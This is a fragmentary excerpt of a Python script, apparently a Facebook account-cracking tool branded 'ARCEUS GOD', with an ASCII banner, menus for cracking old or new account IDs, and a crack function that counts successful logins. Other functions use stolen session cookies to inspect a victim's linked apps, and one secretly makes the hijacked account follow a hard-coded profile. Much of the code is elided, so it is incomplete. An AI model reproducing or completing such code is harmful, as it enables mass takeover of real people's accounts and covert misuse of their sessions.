...
\t██████╔╝██║███████╗██║  ██║███████╗ 
\t╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝
			{b}•{x}•{k}•{love} DEVELOPER 💐 B I L A L_A H M E D {b}{x}•{k}•{b}•{k}''')
#------------------[ NAME AND PSW ASK ]-------------------#
...
def namepsw():
    ...
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        ...
        print(" [\u001b[36m>>\033[1;37m] ENTER YOUR NAME")
    ...
    if os.path.exists("data/password.xml") and os.path.getsize("data/password.xml") > 0:
        ...
        print(" [\u001b[36m>>\033[1;37m] ADD A PSW TO YOUR ACCOUNT")
...
def setting():
	...
	print(" [\u001b[36m1\033[1;37m] FOR OLD IDZ")

	print(" [\u001b[36m2\033[1;37m] FOR NEW IDZ")

	print(" [\u001b[36m3\033[1;37m] FOR MIX IDZ")
...
def cek_apk(session,kuki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kuki}).text
    ...
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":kuki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
def f(ses,kuki):
    ...
    r = sop(ses.get('https://free.facebook.com/profile.php?id=100005360527661', cookies={'cookie': kuki}).text, 'html.parser')
    get = r.find('a', string='Follow').get('href')
    ses.get(('https://free.facebook.com' + str(get)), cookies={'cookie': kuki}).text
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[ARCEUS GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
...
if __name__=='__main__':
	...
	anish_rustapp(f'\n\t{x}——> {h}USE THIS SCRIPT APPROPRIATELY\n\t{x}——> {h}IF THERE ARE BUGS/ERROR SAY YEAH\n\t{x}——> {h}ARCEUS ALWAYS BE HEALTHY\n\t{x}——> {h}HOPEFULLY YOUR SUSTENANCE WILL BE MADE EASY, A MEN\n\t{x}——> {h}HAVE A NICE DAY DEAR{x}')
